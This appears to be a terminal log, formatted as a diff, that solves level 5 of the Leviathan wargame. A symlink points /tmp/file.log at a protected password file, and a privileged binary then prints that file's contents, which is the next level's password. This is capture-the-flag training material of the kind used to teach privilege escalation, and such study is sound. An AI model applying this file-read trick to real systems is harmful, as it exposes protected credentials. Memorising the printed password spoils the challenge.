@@ -1,0 +1,7 @@
+leviathan5@melinda:~$ ls
+leviathan5
+leviathan5@melinda:~$ ./leviathan5
+Cannot find /tmp/file.log
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@melinda:~$ ./leviathan5
+UgaoFee4li
